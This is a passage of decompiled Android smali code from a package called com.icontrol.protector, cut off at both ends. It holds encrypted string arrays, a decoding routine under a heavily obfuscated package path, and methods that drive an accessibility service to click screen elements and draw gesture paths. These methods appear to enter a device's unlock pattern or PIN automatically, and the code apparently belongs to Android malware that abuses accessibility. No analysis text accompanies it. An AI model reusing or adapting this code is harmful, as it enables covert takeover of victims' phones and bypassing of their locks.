        -0x5et
        0x7t
        -0x3bt
        0x6et
        -0x7ct
        0x9t
        0x5t
        -0x48t
    .end array-data

    nop

    :array_55
    .array-data 1
        0xft
        0x7bt
        -0x7dt
        0x1ct
        -0x18t
        0x5dt
        -0x74t
        -0x23t
    .end array-data

    :array_56
    .array-data 1
        0x4dt
        -0x5at
        -0x19t
        -0x63t
        0x38t
        0x68t
        0x1t
        -0x39t
        0x26t
        0x42t
        0x4t
        -0x6t
        -0x77t
        -0x15t
        0x5at
        -0x26t
        -0x4t
        0x16t
        0x52t
        -0x21t
        -0x5et
        -0x49t
        -0x40t
        0x15t
        0x4at
        -0x66t
        0x4at
        0x56t
    .end array-data

    :array_57
    .array-data 1
        -0x77t
        0x36t
        0x24t
        0x3et
        0x18t
        0xat
        -0x20t
        0x7dt
    .end array-data

    :array_58
    .array-data 1
        0x6dt
        -0x73t
        0x1dt
        0xat
        -0x2dt
        0x2t
        0x30t
        0xat
        0x10t
        -0xdt
        0x2bt
        0x5at
        -0x6at
        0x32t
        0x5at
        0x57t
        0x25t
        -0x4bt
        0x44t
        0x4dt
        -0x24t
    .end array-data

    nop

    :array_59
    .array-data 1
        -0x78t
        0x16t
        -0x5dt
        -0x14t
        0x72t
        -0x76t
        -0x29t
        -0x4ft
    .end array-data

    :array_5a
    .array-data 1
        0xct
        -0x33t
        0x63t
        -0x5dt
        -0x6ct
        -0x17t
        -0x6bt
        -0x27t
        0x70t
        -0x42t
        0x72t
        -0x16t
    .end array-data

    :array_5b
    .array-data 1
        -0x17t
        0x56t
        -0x23t
        0x45t
        0x35t
        0x61t
        0x7ct
        0x4dt
    .end array-data

    :array_5c
    .array-data 1
        -0x5ft
        -0x1at
        -0x69t
        -0xdt
        -0x3ct
        -0x48t
        0x32t
        0x67t
        -0x15t
        -0x6et
        -0x55t
        -0x4ft
    .end array-data

    :array_5d
    .array-data 1
        0x44t
        0x7at
        0x1t
        0x15t
        0x65t
        0x30t
        -0x25t
        -0x15t
    .end array-data

    :array_5e
    .array-data 1
        0x4ct
        0x3bt
        -0x3t
        0x37t
        -0x37t
        0x79t
        -0x13t
        0x47t
        0x3t
        0x4ft
        -0x38t
        0x6ct
        -0x7ft
        0x7dt
        -0x5bt
        0x16t
        0x3t
        0x3t
    .end array-data

    nop

    :array_5f
    .array-data 1
        -0x57t
        -0x59t
        0x6bt
        -0x2ft
        0x68t
        -0xft
        0xat
        -0x2t
    .end array-data

    :array_60
    .array-data 1
        0x79t
        0xct
        -0x80t
        0xbt
        0xbt
        0x6t
        0x46t
        -0x71t
        0x1at
        0x7ct
        -0x49t
        0x78t
        0x6at
        0x1dt
        0x29t
        -0x4t
        0x12t
        0x36t
        -0x3dt
        0x44t
        0x28t
    .end array-data

    nop

    :array_61
    .array-data 1
        -0x62t
        -0x67t
        0x2bt
        -0x12t
        -0x74t
        -0x44t
        -0x5ft
        0x15t
    .end array-data

    :array_62
    .array-data 1
        -0x1dt
        0x7ft
        0x4et
        0x50t
        0x4et
        0x29t
        -0x5ct
        0x30t
        -0x44t
        0x1ft
        0x5ct
        0x0t
        0x2ft
        0x17t
        -0x35t
        0x5at
        -0x6at
        0x6ft
        0x36t
        0x32t
        0x59t
        0x75t
        -0x3at
        0x10t
        -0x1dt
        0x7dt
        0x79t
        0x50t
        0x4dt
        0x12t
        -0x5ct
        0x32t
        -0x42t
        0x1ft
        0x5et
        0x2at
    .end array-data

    :array_63
    .array-data 1
        0x0t
        -0x4t
        -0x21t
        -0x4dt
        -0x34t
        -0x6at
        0x47t
        -0x4dt
    .end array-data

    :array_64
    .array-data 1
        -0x6ft
        -0x2bt
        -0x6ft
        -0xct
        0x24t
        -0x49t
        -0x39t
        -0x13t
        -0x32t
        -0x4bt
        -0x7dt
        -0x5ct
        0x45t
        -0x77t
        -0x58t
        -0x78t
        -0x21t
        -0xbt
        -0x1dt
        -0x6at
        0x31t
        -0x15t
        -0x5bt
        -0x1ft
        -0x6ft
        -0x29t
        -0x7et
        -0xct
        0x24t
        -0x7et
        -0x39t
        -0x11t
        -0x34t
        -0x4bt
        -0x7ft
        -0x74t
        0x45t
        -0x76t
        -0x49t
    .end array-data

    :array_65
    .array-data 1
        0x72t
        0x56t
        0x0t
        0x17t
        -0x5at
        0x8t
        0x24t
        0x6et
    .end array-data

    :array_66
    .array-data 1
        0x4ct
        -0x5t
        -0x4ft
        0x3ct
        -0x5dt
        -0xat
        -0x61t
        0x67t
        0x3et
        -0x63t
        -0x6bt
        0x46t
        -0x36t
        -0x12t
        -0x13t
        0x5t
        0x2bt
        -0x3ft
        -0x9t
        0x5at
        -0x6bt
        -0x72t
        -0x1t
        0x55t
        0x4at
        -0x1t
        -0x68t
        0x3ft
        -0x7ct
        -0x32t
        -0x61t
        0x67t
        0x3et
        -0x63t
        -0x6bt
        0x56t
        -0x36t
        -0x14t
        -0x2t
        0x5t
        0x2bt
        -0xct
        -0x9t
        0x58t
        -0x69t
        -0x72t
        -0x3t
        0x7dt
        0x4at
        -0x4t
        -0x79t
    .end array-data

    :array_67
    .array-data 1
        -0x57t
        0x7et
        0x14t
        -0x27t
        0x29t
        0x6dt
        0x7ct
        -0x1at
    .end array-data

    :array_68
    .array-data 1
        0x1ft
        -0x60t
        -0x3at
        -0x1dt
        0xat
        -0x1et
        0x2et
        0x20t
        0x3ct
        -0x5at
        -0x34t
        -0x1t
        0x3t
    .end array-data

    nop

    :array_69
    .array-data 1
        0x48t
        -0x2et
        -0x57t
        -0x73t
        0x6dt
        -0x3et
        0x5et
        0x41t
    .end array-data

    :array_6a
    .array-data 1
        0x24t
        -0x69t
        -0x5at
        0x1ft
        -0x13t
        0x9t
        0x51t
        0x48t
        0x19t
        -0x27t
        -0x4bt
        0x11t
        -0x15t
        0xft
        0x51t
        0x59t
        0x3t
    .end array-data

    nop

    :array_6b
    .array-data 1
        0x6dt
        -0x7t
        -0x3bt
        0x70t
        -0x61t
        0x7bt
        0x34t
        0x2bt
    .end array-data

    :array_6c
    .array-data 1
        0x47t
        -0x29t
        -0x5ft
        0x24t
        0x3t
        0x30t
        0x1bt
        -0x26t
        0x7at
        -0x67t
        -0x4et
        0x2at
        0x5t
        0x36t
        0x1bt
        -0x35t
        0x60t
        -0x67t
        -0x5at
        0x39t
        0x10t
        0x35t
        0x10t
    .end array-data

    :array_6d
    .array-data 1
        0xet
        -0x47t
        -0x3et
        0x4bt
        0x71t
        0x42t
        0x7et
        -0x47t
    .end array-data

    :array_6e
    .array-data 1
        0x27t
        0x6t
        -0x61t
        -0x5dt
        0x78t
        0x4ft
        0x3ft
        -0x3et
        0x57t
        -0x48t
        -0x16t
        -0x3ct
        0x7at
        0x19t
        0x50t
        -0x1at
    .end array-data

    :array_6f
    .array-data 1
        -0x35t
        -0x68t
        0x7t
        0x48t
        -0x2et
        -0xct
        -0x2ct
        0x52t
    .end array-data

    :array_70
    .array-data 1
        0xat
        -0x60t
        -0x60t
        0x29t
        0x33t
        -0x12t
        -0x11t
        -0x49t
        0x52t
        -0x2ct
        -0x55t
        0x42t
        -0x5dt
        -0x6at
        -0x6ft
        -0x68t
        0xat
        -0x5bt
        -0x74t
        -0x1et
        0x6et
        -0xat
        -0x54t
        -0x1t
        0x62t
        -0x74t
    .end array-data

    nop

    :array_71
    .array-data 1
        -0x1at
        0x38t
        0xct
        -0x3et
        -0x7dt
        0x7at
        0x4t
        0x12t
    .end array-data

    :array_72
    .array-data 1
        -0x62t
        -0x67t
        0x34t
        0xat
        -0x6t
        0x3t
        0x75t
        -0x18t
        -0x9t
        0x35t
        0x70t
        0x79t
        -0x1at
        0x5ct
        0x33t
        -0x32t
        0x53t
        -0x7t
        0x2t
        0x62t
        -0x6bt
        0x17t
        0x3ct
        -0x68t
        -0x1bt
        -0x63t
        0x70t
        0x6dt
        -0x35t
        0x5ct
        0x12t
        -0x3t
        -0x68t
        -0x62t
        0x38t
    .end array-data

    :array_73
    .array-data 1
        0x73t
        0x15t
        -0x64t
        -0x19t
        0x7et
        -0x49t
        -0x67t
        0x75t
    .end array-data

    :array_74
    .array-data 1
        -0x6bt
        -0x70t
        -0x7ct
        -0x50t
        0x20t
        0x2at
        -0x7at
        -0x76t
        -0x54t
        -0x61t
        -0x7dt
        -0x53t
        -0x6ft
        -0x5t
        -0x74t
        -0x22t
        -0x56t
    .end array-data

    nop

    :array_75
    .array-data 1
        -0x3bt
        -0xft
        -0x20t
        -0x3et
        -0x1dt
        -0x77t
        -0x17t
        -0x56t
    .end array-data

    :array_76
    .array-data 1
        -0x38t
        -0x39t
        -0x3t
        0x3at
        -0xft
        0x7dt
        0x21t
        -0x44t
        -0x3t
        -0x2ct
        -0x15t
        0x29t
        0x56t
        -0x4ft
    .end array-data

    nop

    :array_77
    .array-data 1
        -0x68t
        -0x5at
        -0x67t
        0x48t
        0x32t
        -0x22t
        0x4et
        -0x64t
    .end array-data

    :array_78
    .array-data 1
        -0x29t
        0x5bt
        -0x43t
        -0x61t
        -0xat
        -0x78t
        -0x53t
        0x50t
        -0x12t
        0x54t
        -0x46t
        -0x7et
        0x47t
        0x59t
        -0x59t
        0x4t
        -0x18t
        0x1at
        -0x43t
        -0x78t
        0x46t
        0x4et
        -0x54t
        0x18t
        -0x1at
        0x5et
        -0x4at
    .end array-data

    :array_79
    .array-data 1
        -0x79t
        0x3at
        -0x27t
        -0x13t
        0x35t
        0x2bt
        -0x3et
        0x70t
    .end array-data

    :array_7a
    .array-data 1
        0x4et
        0x2at
        -0x59t
        -0x19t
        -0x2et
        0xat
        -0x3et
        -0x51t
        0x62t
        0x2et
        -0x60t
        -0x1dt
        -0x30t
    .end array-data

    nop

    :array_7b
    .array-data 1
        0x6t
        0x4bt
        -0x2dt
        -0x7at
        -0x42t
        -0x32t
        0x73t
        -0x71t
    .end array-data

    :array_7c
    .array-data 1
        -0x69t
        -0x1dt
        0x65t
        0x53t
        0x11t
        -0x66t
        0x18t
        -0x54t
        -0x12t
        -0x1at
        0x6et
        0x4ct
        -0x50t
        0x45t
    .end array-data

    nop

    :array_7d
    .array-data 1
        -0x32t
        -0x7et
        0xbt
        0x3ft
        -0x2bt
        0x2bt
        -0x23t
        0x33t
    .end array-data

    :array_7e
    .array-data 1
        -0x1ct
        -0x5bt
        -0x5et
        0x40t
        -0x48t
        -0x5dt
        0x6ct
        0x2dt
        0x12t
        -0x59t
        -0x5et
        0x54t
        -0x50t
        -0x4bt
        0x6bt
        -0x7ct
        -0x40t
        -0x53t
        -0x13t
        0x10t
        -0x44t
        -0x5ct
        0x3et
        -0x79t
        -0x31t
        -0x56t
        -0x13t
        0x42t
        -0x55t
        -0x4et
        0x7dt
        -0x66t
        -0x32t
    .end array-data

    nop

    :array_7f
    .array-data 1
        -0x5ft
        -0x37t
        -0x7et
        0x30t
        -0x27t
        -0x29t
        0x1et
        -0x12t
    .end array-data

    :array_80
    .array-data 1
        -0x46t
        0x32t
        0x39t
        -0x46t
        -0x72t
        -0x70t
        -0x6dt
        0x65t
        -0x69t
        0x3at
        0x6bt
        -0x41t
        -0x74t
        -0x24t
        -0x61t
        0x6ft
        -0x70t
        0x2et
        0x6bt
        -0x58t
        -0x7ct
        -0x24t
        -0x75t
        0x6ct
    .end array-data

    :array_81
    .array-data 1
        -0x7t
        0x5dt
        0x4bt
        -0x25t
        -0x1bt
        -0x50t
        -0x16t
        0x4t
    .end array-data

    :array_82
    .array-data 1
        -0x41t
        0x18t
        0x17t
        -0x2et
        -0x1at
        0x58t
        -0x45t
        0x76t
        -0x41t
        0x1t
        0x17t
        -0x2et
        -0x1at
        0x58t
        -0x46t
        0x41t
        -0x42t
        0x37t
        0x16t
        -0x20t
        -0x1at
        0x58t
        -0x45t
        0x7dt
        -0x42t
        0x38t
        0x16t
        -0x1at
        -0x1at
        0x58t
        -0x45t
        0x72t
        -0x41t
        0x1ft
        0x17t
        -0x23t
        -0x4t
        0x55t
    .end array-data

    nop

    :array_83
    .array-data 1
        0x67t
        -0x4et
        -0x32t
        0x57t
        0x24t
        -0x8t
        0x63t
        -0x39t
    .end array-data

    :array_84
    .array-data 1
        -0x6t
        -0x65t
        -0x1ft
        0x1et
        0x61t
        -0x17t
        0x66t
        0x4at
        -0x7dt
        0x2bt
        0x51t
        -0x24t
        0x28t
        -0x41t
        -0x16t
        0x11t
        -0x7ct
        -0x60t
        0x57t
        -0x63t
        0x29t
        0x5ct
        0x2bt
        -0x62t
        0x56t
    .end array-data

    nop

    :array_85
    .array-data 1
        0x3et
        0xbt
        0x22t
        -0x43t
        0x41t
        -0x61t
        -0x79t
        -0x10t
    .end array-data

    :array_86
    .array-data 1
        0x39t
        -0x28t
        -0x4dt
        -0x8t
        -0x3at
        -0x6bt
        0x70t
        -0x72t
    .end array-data

    :array_87
    .array-data 1
        -0x19t
        -0x68t
        0x29t
    .end array-data

    :array_88
    .array-data 1
        -0x7at
        -0x15t
        0x4dt
        -0x48t
        0x1et
        -0x24t
        -0x68t
        -0x7at
    .end array-data

    :array_89
    .array-data 1
        -0x68t
        -0x43t
        -0x50t
    .end array-data

    :array_8a
    .array-data 1
        -0x7t
        -0x32t
        -0x2ct
        0x12t
        -0x53t
        -0x24t
        0x4ct
        0xat
    .end array-data

    :array_8b
    .array-data 1
        0x2bt
        -0x7bt
        0x6at
        0x2at
        -0x6ft
        0x3at
        0x61t
        0xdt
    .end array-data

    :array_8c
    .array-data 1
        0x30t
        0x1ct
        0x18t
    .end array-data

    :array_8d
    .array-data 1
        0x51t
        0x6ft
        0x7ct
        -0x4t
        0x39t
        0x36t
        0x18t
        0x76t
    .end array-data

    :array_8e
    .array-data 1
        0x19t
        0x5ct
        -0x21t
        -0x39t
        0x2dt
        0x59t
        -0x5bt
        0x5et
    .end array-data

    :array_8f
    .array-data 1
        0x5t
        0x39t
        -0x6et
        0x77t
        0xbt
        -0x50t
        -0xat
    .end array-data

    :array_90
    .array-data 1
        0x64t
        0x57t
        -0xat
        0x5t
        0x64t
        -0x27t
        -0x6et
        -0x51t
    .end array-data

    :array_91
    .array-data 1
        0x12t
        -0xat
        -0xet
    .end array-data

    :array_92
    .array-data 1
        0x73t
        -0x7bt
        -0x6at
        -0x6et
        0x64t
        0x26t
        0x2bt
        0x77t
    .end array-data

    :array_93
    .array-data 1
        -0x57t
        0x13t
        0x2at
        0x2bt
        -0x58t
        0x63t
        -0x13t
        -0x78t
    .end array-data
.end method

.method private static g(Lcom/icontrol/protector/AccessServices;)V
    .locals 3

    .line 1
    const/16 v0, 0x26

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    const/16 v0, 0x21

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :goto_0
    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->a(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    return-void

    nop

    :array_0
    .array-data 1
        0x1et
        -0x9t
        -0x3dt
        0x13t
        -0x75t
        -0x2t
        -0x57t
        0x59t
        0x12t
        -0xft
        -0x36t
        0x13t
        -0x67t
        -0x17t
        -0x42t
        0x5ft
        0x18t
        -0xbt
        -0x25t
        0x54t
        -0x30t
        -0x7t
        -0x57t
        0x4t
        0x16t
        -0x3t
        -0x29t
        0x62t
        -0x71t
        -0x2t
        -0x47t
        0x4et
        0xft
        -0x39t
        -0x26t
        0x58t
        -0x6et
        -0x1ct
    .end array-data

    nop

    :array_1
    .array-data 1
        0x7dt
        -0x68t
        -0x52t
        0x3dt
        -0x16t
        -0x70t
        -0x33t
        0x2bt
    .end array-data

    :array_2
    .array-data 1
        0x2dt
        -0x50t
        0x9t
        -0x5dt
        -0x45t
        0x28t
        0x45t
        -0x4bt
        0x21t
        -0x4at
        0x0t
        -0x5dt
        -0x57t
        0x3ft
        0x52t
        -0x4dt
        0x2bt
        -0x4et
        0x11t
        -0x1ct
        -0x20t
        0x2ft
        0x45t
        -0x18t
        0x25t
        -0x46t
        0x1dt
        -0x2et
        -0x41t
        0x28t
        0x55t
        -0x5et
        0x3ct
    .end array-data

    nop

    :array_3
    .array-data 1
        0x4et
        -0x21t
        0x64t
        -0x73t
        -0x26t
        0x46t
        0x21t
        -0x39t
    .end array-data
.end method

.method private static h(Lcom/icontrol/protector/AccessServices;)V
    .locals 12

    .line 1
    const/16 v0, 0x27

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    const/16 v0, 0x2e

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_0
    if-nez v0, :cond_1

    return-void

    :cond_1
    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    iget v0, v2, Landroid/graphics/Rect;->right:I

    iget v3, v2, Landroid/graphics/Rect;->left:I

    sub-int/2addr v0, v3

    div-int/lit8 v0, v0, 0x6

    iget v3, v2, Landroid/graphics/Rect;->bottom:I

    iget v4, v2, Landroid/graphics/Rect;->top:I

    sub-int/2addr v3, v4

    div-int/lit8 v3, v3, 0x6

    new-instance v4, Ljava/util/LinkedList;

    invoke-direct {v4}, Ljava/util/LinkedList;-><init>()V

    const/4 v5, 0x0

    move v6, v5

    :goto_0
    const/4 v7, 0x3

    if-ge v6, v7, :cond_2

    new-instance v7, Lcom/icontrol/protector/c$f;

    iget v8, v2, Landroid/graphics/Rect;->left:I

    add-int/2addr v8, v0

    int-to-float v8, v8

    iget v9, v2, Landroid/graphics/Rect;->top:I

    add-int/2addr v9, v3

    mul-int v10, v3, v6

    mul-int/lit8 v10, v10, 0x2

    add-int/2addr v9, v10

    int-to-float v9, v9

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v11, ""

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v7, v8, v9, v10}, Lcom/icontrol/protector/c$f;-><init>(FFLjava/lang/String;)V

    invoke-virtual {v4, v7}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    :cond_2
    new-instance v6, Lcom/icontrol/protector/c$f;

    iget v8, v2, Landroid/graphics/Rect;->left:I

    mul-int/2addr v0, v7

    add-int/2addr v8, v0

    int-to-float v0, v8

    iget v2, v2, Landroid/graphics/Rect;->top:I

    mul-int/lit8 v3, v3, 0x5

    add-int/2addr v2, v3

    int-to-float v2, v2

    const/4 v3, 0x1

    new-array v7, v3, [B

    const/16 v8, -0x20

    aput-byte v8, v7, v5

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    invoke-static {v7, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v6, v0, v2, v1}, Lcom/icontrol/protector/c$f;-><init>(FFLjava/lang/String;)V

    invoke-virtual {v4, v6}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    new-instance v0, Landroid/graphics/Path;

    invoke-direct {v0}, Landroid/graphics/Path;-><init>()V

    invoke-virtual {v4, v5}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/icontrol/protector/c$f;

    iget v1, v1, Lcom/icontrol/protector/c$f;->a:F

    invoke-virtual {v4, v5}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/icontrol/protector/c$f;

    iget v2, v2, Lcom/icontrol/protector/c$f;->b:F

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Path;->moveTo(FF)V

    :goto_1
    invoke-virtual {v4}, Ljava/util/LinkedList;->size()I

    move-result v1

    if-ge v3, v1, :cond_3

    invoke-virtual {v4, v3}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/icontrol/protector/c$f;

    iget v1, v1, Lcom/icontrol/protector/c$f;->a:F

    invoke-virtual {v4, v3}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/icontrol/protector/c$f;

    iget v2, v2, Lcom/icontrol/protector/c$f;->b:F

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Path;->lineTo(FF)V

    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    :cond_3
    const/16 v1, 0xd

    invoke-static {v0, v1, p0}, Lcom/icontrol/protector/c;->n(Landroid/graphics/Path;ILcom/icontrol/protector/AccessServices;)V

    sget-object p0, Lcom/icontrol/protector/c;->d:Ljava/util/Set;

    invoke-interface {p0}, Ljava/util/Set;->clear()V

    sget-object p0, Lcom/icontrol/protector/c;->c:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    sget-object p0, Lcom/icontrol/protector/c;->e:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    return-void

    :array_0
    .array-data 1
        -0x2ft
        0x1t
        0x1et
        -0x13t
        0x72t
        0x44t
        -0x68t
        -0x3t
        -0x23t
        0x7t
        0x17t
        -0x13t
        0x60t
        0x53t
        -0x71t
        -0x5t
        -0x29t
        0x3t
        0x6t
        -0x56t
        0x29t
        0x43t
        -0x68t
        -0x60t
        -0x22t
        0x1t
        0x10t
        -0x58t
        0x43t
        0x4bt
        -0x78t
        -0x5t
        -0x29t
        0x1ct
        0x1dt
        -0x6bt
        0x7at
        0x4ft
        -0x75t
    .end array-data

    :array_1
    .array-data 1
        -0x4et
        0x6et
        0x73t
        -0x3dt
        0x13t
        0x2at
        -0x4t
        -0x71t
    .end array-data

    :array_2
    .array-data 1
        0x72t
        -0x68t
        0x7at
        0x6bt
        0x3at
        -0x27t
        -0x2et
        0x5ct
        0x7et
        -0x62t
        0x73t
        0x6bt
        0x28t
        -0x32t
        -0x3bt
        0x5at
        0x74t
        -0x66t
        0x62t
        0x2ct
        0x61t
        -0x22t
        -0x2et
        0x1t
        0x67t
        -0x62t
        0x61t
        0x2at
        0x4t
        -0x25t
        -0x27t
        0x4dt
        0x7at
        -0x58t
        0x67t
        0x24t
        0x2ft
        -0x3dt
        -0x2dt
        0x5ct
        0x7ft
        -0x58t
        0x61t
        0x2ct
        0x3et
        -0x40t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x11t
        -0x9t
        0x17t
        0x45t
        0x5bt
        -0x49t
        -0x4at
        0x2et
    .end array-data

    :array_4
    .array-data 1
        -0x2ct
        -0x34t
        0x6t
        -0x17t
        -0x5ft
        -0x69t
        0x19t
        -0x12t
    .end array-data
.end method

.method private static i(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)V
    .locals 4

    .line 1
    const/4 v0, 0x0

    :goto_0
    const/4 v1, 0x6

    if-ge v0, v1, :cond_3

    const/4 v1, 0x1

    move v2, v1

    :goto_1
    const/4 v3, 0x7

    if-ge v2, v3, :cond_0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/icontrol/protector/AccessServices;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    invoke-static {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->a(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :cond_0
    invoke-static {p0}, Lcom/icontrol/protector/c;->g(Lcom/icontrol/protector/AccessServices;)V

    :try_start_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v2

    if-eq v2, v1, :cond_2

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v1

    const/16 v2, 0xe

    if-ne v1, v2, :cond_1

    goto :goto_2

    :cond_1
    const/16 v1, 0xc8

    goto :goto_3

    :catch_0
    move-exception p0

    goto :goto_4

    :cond_2
    :goto_2
    const/16 v1, 0x320

    :goto_3
    int-to-long v1, v1

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :goto_4
    new-instance p1, Ljava/lang/RuntimeException;

    invoke-direct {p1, p0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw p1

    :cond_3
    const-string p0, ""

    sput-object p0, Lcom/icontrol/protector/AccessServices;->R:Ljava/lang/String;

    return-void
.end method

.method public static j(Lcom/icontrol/protector/AccessServices;)V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/c$d;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/c$d;-><init>(Lcom/icontrol/protector/AccessServices;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static k(Lcom/icontrol/protector/AccessServices;)V
    .locals 10

    .line 1
    sput-object p0, Lcom/icontrol/protector/c;->a:Lcom/icontrol/protector/AccessServices;

    new-instance p0, Ljava/util/LinkedList;

    invoke-direct {p0}, Ljava/util/LinkedList;-><init>()V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v1, 0x3

    new-array v1, v1, [B

    fill-array-data v1, :array_0

